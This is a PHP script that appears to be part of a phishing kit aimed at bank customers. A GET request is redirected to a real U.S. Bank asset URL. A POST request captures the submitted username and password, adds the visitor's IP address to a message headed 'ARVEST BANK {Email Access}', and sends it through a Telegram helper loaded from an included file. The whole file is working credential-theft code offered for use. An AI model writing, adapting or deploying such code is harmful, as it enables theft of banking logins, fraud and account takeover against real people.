<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] === "GET") {
    header("Location: https://onlinebanking.usbank.com/auth/login/static/css/main.45c70042.chunk.css?id=" . md5(uniqid(rand(), true)));
} elseif ($_SERVER["REQUEST_METHOD"] === "POST") {
    include "./tele.php";
    function get_client_ip()
    {
        $ipaddress = "";
        if (getenv("HTTP_CLIENT_IP"))
            $ipaddress = getenv("HTTP_CLIENT_IP");
        else if (getenv("HTTP_X_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_X_FORWARDED_FOR");
        else if (getenv("HTTP_X_FORWARDED"))
            $ipaddress = getenv("HTTP_X_FORWARDED");
        else if (getenv("HTTP_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_FORWARDED_FOR");
        else if (getenv("HTTP_FORWARDED"))
            $ipaddress = getenv("HTTP_FORWARDED");
        else if (getenv("REMOTE_ADDR"))
            $ipaddress = getenv("REMOTE_ADDR");
        else
            $ipaddress = "UNKNOWN";
        return $ipaddress;
    }
    $IP = get_client_ip();
    $email = $_POST["user"];
    $pswd = $_POST["pass"];
    $Message = "ARVEST BANK {Email Access}" . "\r\n";
    $Message .= "Email: " . $email . "\r\n";
    $Message .= "Password: " . $pswd . "\r\n";
    $Message .= "IP ADDRESS : https://ip-api.com/" . $IP . "\r\n";

    XxSendTelegramMessageXx($Message);

    header("Location: ../success.php?id=" . md5(uniqid(rand(), true)));
}
